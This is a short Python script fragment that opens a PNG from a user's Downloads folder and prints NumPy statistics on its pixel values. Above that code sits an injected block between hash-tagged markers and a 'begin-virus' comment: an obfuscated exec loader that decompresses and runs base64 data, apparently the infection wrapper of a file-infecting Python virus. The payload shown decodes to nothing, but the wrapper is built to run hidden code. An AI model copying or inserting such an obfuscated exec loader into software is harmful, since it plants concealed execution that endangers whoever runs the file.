...
# begin-96e3a9cbb5339fbddd61093b9f4ae2ab
exec("import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b'eNoDAAAAAAE=')))")
# end-96e3a9cbb5339fbddd61093b9f4ae2ab
# begin-virus
...
from UTIL import *
image=Image.open(r"C:\Users\WinstonBai\Downloads\maxresdefault (1).png")
image_array=np.array(image)
print(image_array)
np.nonzero(image_array)
np.unique(image_array, return_counts=True)
